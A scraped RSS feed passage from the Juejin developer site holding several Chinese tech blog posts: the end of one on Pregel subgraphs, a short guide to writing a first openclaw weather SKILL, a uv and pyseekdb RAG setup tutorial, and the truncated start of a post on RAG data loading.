<p>PregelNode的subgraphs字段提供了 “子图” 的静态注册，其实任何一个Pregel对象都可以在无需注册前提下被另一个Pregel的Node调用，而且反映当前执行上下文的一些执行配置会通过上下文变量（ContenxtVars） “流向” 作为子图的Pregel对象。前面我们演示子图调用涉及的Checkpoint命名空间的例子已经充分体现了这一点。但是这种显式的静态声明对于图的静态图分析与可视化有着积极的作用。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[自研第一个SKILL-openclaw入门]]></title>    <link>https://juejin.cn/post/7605848213603074094</link>    <guid>https://juejin.cn/post/7605848213603074094</guid>    <pubDate>2026-02-13T00:29:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605848213603074094" data-draft-id="7605848213603041326" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="自研第一个SKILL-openclaw入门"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-02-13T00:29:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="iqiu"/> <meta itemprop="url" content="https://juejin.cn/user/1053802635204378"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            自研第一个SKILL-openclaw入门
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1053802635204378/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    iqiu
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T00:29:06.000Z" title="Fri Feb 13 2026 00:29:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">自研第一个SKILL-openclaw入门</h2>
<p>openclaw不是搭建好了就结束了，用起来才能发挥作用，而SKILL，就是openclaw的灵魂，是openclaw的内功。</p>
<p>所以准备慢慢记录学习openclaw的skill之路。</p>
<p>所谓读万卷书不如行万里路，实践对知识的理解非常重要，今天就准备自己开发一个简单的SKILL，来加深对SKILL的理解。</p>
<p>如果还不知道SKILL是什么，建议先看第一篇：</p>
<h3 data-id="heading-1">抄一个还是改一个</h3>
<p>学字先描红，开发先抄，cv程序员的称号不是白得的。</p>
<p>先看看这个：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2746c421c8df4407a40c38f944779e62~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaXFpdQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771547346&amp;x-signature=uDVR%2FgzwV9nI27H4gu13Y5%2FzMys%3D" alt="2.png" loading="lazy"/></p>
<p>openclaw毕竟是外国人开发的，默认的skill都是国外的，比如这个天气查询，先找到这个系统自带的skill看看：</p>
<p>这个skill位于系统内置skill的目录：</p>
<pre><code class="hljs language-bash" lang="bash">/app/skills/weather/SKILL.md
</code></pre>
<p>这个SKILL的内容：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/862bce102672405e9cbd4277ecc78d4e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaXFpdQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771547346&amp;x-signature=ZKGNoWjErPRbBrIK08t2EYsTxrw%3D" alt="3.png" loading="lazy"/>
一个查询天气的skill，还挺复杂，有主要的服务，还有备份的，可惜都是国外的服务，国人用就有点水土不服了，就以他为例，改成简单的国内的：</p>
<p>完整的代码如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8b8a512e9d3046f38c82db144065ad87~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaXFpdQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771547346&amp;x-signature=TD8Zri6pumtgB%2FOaZOuBQByaau0%3D" alt="4.png" loading="lazy"/></p>
<p>需要重启gateway生效，然后问一下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f8c45a0b4b674e599160b3e79654c1db~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaXFpdQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771547346&amp;x-signature=PjrYVY8KTfpj71%2BEw%2BqnlmuKew0%3D" alt="1.png" loading="lazy"/></p>
<p>万事大吉了！</p>
<h3 data-id="heading-2">小结</h3>
<p>这是第一个自研的SKILL，功能不大，却也实用，再找一个免费的天气接口，作为备份，完善一下，就可以替代系统自带的天气SKILL了。</p>
<p>从简单开始，从复制开始，慢慢学习复杂一点的SKILL，开发openclaw的功能！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[uv × pyseekdb：把 RAG 环境与检索落地成本降到最低]]></title>    <link>https://juejin.cn/post/7605625595570421775</link>    <guid>https://juejin.cn/post/7605625595570421775</guid>    <pubDate>2026-02-13T02:03:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605625595570421775" data-draft-id="7605542907118698548" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="uv × pyseekdb：把 RAG 环境与检索落地成本降到最低"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-02-13T02:03:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="老纪的技术唠嗑局"/> <meta itemprop="url" content="https://juejin.cn/user/2394058441104739"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            uv × pyseekdb：把 RAG 环境与检索落地成本降到最低
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2394058441104739/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    老纪的技术唠嗑局
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T02:03:06.000Z" title="Fri Feb 13 2026 02:03:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">01 AI 开发者的基建</h2>
<p>过去很多团队把主要精力放在算法本身；在大模型生态成熟后，工程侧更常见的阻塞变成两类：一是环境与依赖的可复现，二是数据导入、检索与存储的落地成本。AI 项目往往带着较重的依赖组合（如 PyTorch、Transformers、各类 RAG 框架），如果每次协作、换机器、进 CI 都要重新处理 Python 版本、虚拟环境、锁文件与依赖冲突，成本会被放大。</p>
<p>这篇文章介绍两个工具，目标是把环境成本和检索数据落地成本更低：</p>
<ul>
<li><code>uv</code>：由 Astral 团队推出的 Rust 编写的 Python 包管理器，以速度与一致性优化 Python 工作流。</li>
<li><code>pyseekdb</code>：面向 seekdb 与 OceanBase AI search 的 Python SDK，支持嵌入式与远程两种部署方式，并覆盖向量、全文与混合检索能力。</li>
</ul>
<h2 data-id="heading-1">02 什么是 uv</h2>
<p>在 Python 生态里，装包本身并不难，难在团队协作下的一致性：不同人用不同工具（<code>pip+venv</code>/<code>poetry</code>），再叠加不同 OS、代理、CPU 架构，常见结果是代码没问题，但别人跑不起来。</p>
<p>uv 的项目模式围绕 <code>pyproject.toml</code> 管依赖、用 <code>uv.lock</code> 锁定解析结果，并通过 <code>uv sync</code>/<code>uv run</code>让环境与锁文件保持一致。它的定位很明确：<strong>用一个命令行把项目、依赖、锁版本、环境同步与运行命令这一整套工作流连起来，并强调性能与工程化一致性。</strong></p>
<h2 data-id="heading-2">03 pyseekdb 简介</h2>
<p>RAG 场景里，开发者通常需要把文本切分、向量化、入库、检索、过滤、排序这一套链路跑通。pyseekdb 提供的是偏应用侧的 SDK：以 collection 为中心组织数据与检索逻辑，覆盖向量、全文与混合检索，并同时支持嵌入式与远程模式。</p>
<h3 data-id="heading-3">3.1 两种连接形态</h3>
<p>pyseekdb 支持：</p>
<ul>
<li>嵌入式：在 Python 进程内使用本地路径持久化数据，适合本地实验、测试或轻量应用。</li>
<li>远程：连接到远程 seekdb 服务或 OceanBase 集群。</li>
</ul>
<h3 data-id="heading-4">3.2 混合检索（Hybrid Search）</h3>
<p>在 pyseekdb 中，可以通过 query 调用执行向量检索或混合检索（由后端能力与配置决定），返回包含相似度与文档片段的结果集。与直接操控底层索引相比，这种方式更适合应用侧快速落地。</p>
<h3 data-id="heading-5">04 为什么 pyseekdb 需要 uv</h3>
<p>pyseekdb 本身不一定重，但它经常会和 LangChain、LlamaIndex、Dify 等组合使用。一旦依赖开始变重，环境初始化与复现就更容易拖慢协作效率。
<code>uv</code> 在这里的价值主要是两点：</p>
<ul>
<li>用 <code>uv.lock</code> 明确锁定解析结果，并用 <code>uv sync</code> / <code>uv run</code> 把安装/同步/运行收敛到更少的步骤。</li>
<li>在共享 demo 时，用 <code>uv sync</code> 或 <code>uv run</code> 尽量复现同一套环境。</li>
</ul>
<p><strong>pyseekdb 的嵌入式特性配合 uv 的轻量环境，让开发者在普通笔记本上就能完成从数据导入、索引构建到 RAG 问答的全流程开发。</strong></p>
<h3 data-id="heading-6">05 手把手教你轻松构建</h3>
<p>下面用 pyseekdb GitHub 官方 demo/rag 跑通一条完整链路，目标是让你在 5 分钟内从“环境准备”到“可查询的知识库界面”。</p>
<p><strong>前置条件</strong>：</p>
<ul>
<li>Python 3.11+</li>
<li>已安装 uv</li>
<li>已准备 LLM API Key（用于生成回答）</li>
<li>pyseekdb</li>
</ul>
<p><strong>步骤 1：准备环境</strong></p>
<pre><code class="hljs language-plain" lang="plain">git clone https://github.com/oceanbase/pyseekdb.git
cd demo/rag
uv sync
</code></pre>
<p>如果需要本地模型（<code>sentence-transformers</code>）</p>
<pre><code class="hljs language-plain" lang="plain">uv sync --extra local
</code></pre>
<p><strong>步骤 2：配置 .env</strong></p>
<pre><code class="hljs language-plain" lang="plain">cp .env.example .env
</code></pre>
<p>推荐先用默认 embedding（无需额外 API Key）：</p>
<pre><code class="hljs language-plain" lang="plain">EMBEDDING_FUNCTION_TYPE=default
OPENAI_API_KEY=sk-your-key
OPENAI_BASE_URL=https://dashscope.aliyuncs.com/compatible-mode/v1
OPENAI_MODEL_NAME=qwen-plus
SEEKDB_DIR=./data/seekdb_rag
SEEKDB_NAME=test
COLLECTION_NAME=embeddings
</code></pre>
<p><strong>说明</strong>：</p>
<ul>
<li>default 会自动下载内置 ONNX 模型，适合先验证流程。</li>
<li>若改为 api，请补齐<code>EMBEDDING_*</code>相关配置。</li>
<li>若改为 local，请配置<code>SENTENCE_TRANSFORMERS_*</code>并确保已安装<code>--extra local</code>依赖。</li>
</ul>
<p><strong>步骤 3：导入数据</strong></p>
<pre><code class="hljs language-plain" lang="plain">uv run python seekdb_insert.py ../../README.md
</code></pre>
<p><img src="https://intranetproxy.alipay.com/skylark/lark/0/2026/png/32756313/1770947523807-728fd488-e2eb-4540-b9bc-ce31d18e79ca.png" alt="" loading="lazy"/></p>
<p>也可以导入目录：</p>
<pre><code class="hljs language-plain" lang="plain">uv run python seekdb_insert.py path/to/your_dir
</code></pre>
<p>你会看到脚本输出导入的分块数量与进度，成功后数据会落在<code>SEEKDB_DIR</code>指定目录中。</p>
<p><strong>步骤 4：启动界面</strong></p>
<pre><code class="hljs language-plain" lang="plain">uv run streamlit run seekdb_app.py
</code></pre>
<p><img src="https://intranetproxy.alipay.com/skylark/lark/0/2026/png/32756313/1770947523875-440befd2-c821-4b54-9790-c91d30f577f5.png" alt="" loading="lazy"/></p>
<p>启动后打开浏览器，在输入框里提问即可看到：</p>
<ul>
<li>检索到的相关片段</li>
<li>LLM 的生成回答（依赖你在<code>.env</code>里配置的 LLM）</li>
</ul>
<p><img src="https://intranetproxy.alipay.com/skylark/lark/0/2026/png/32756313/1770947523869-981b2e84-adab-4da0-b55d-6931acd31622.png" alt="" loading="lazy"/></p>
<p><strong>效果：</strong></p>
<ul>
<li>文档被切分、向量化并写入 seekdb</li>
<li>查询时执行向量/混合检索</li>
<li>UI 中展示检索结果与 LLM 生成答案</li>
</ul>
<h2 data-id="heading-7">06 回归开发的本质</h2>
<p>uv 解决的是项目环境可复现与流程收敛，pyseekdb 解决的是RAG 场景下的存储与检索落地成本和易用性。把两者放在一起，是把 demo 交付与协作时的摩擦做小：项目结构、依赖、运行方式更统一；本地 embedded 能快速开始，之后再按需要切到远程服务。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[RAG的基石-数据加载]]></title>    <link>https://juejin.cn/post/7605811866908246025</link>    <guid>https://juejin.cn/post/7605811866908246025</guid>    <pubDate>2026-02-13T01:07:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605811866908246025" data-draft-id="7605711582430674995" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="RAG的基石-数据加载"/> <meta itemprop="keywords" content="AIGC,LangChain"/> <meta itemprop="datePublished" content="2026-02-13T01:07:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="架架架构师"/> <meta itemprop="url" content="https://juejin.cn/user/860253654882618"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            RAG的基石-数据加载
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/860253654882618/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    架架架构师
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T01:07:00.000Z" title="Fri Feb 13 2026 01:07:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body 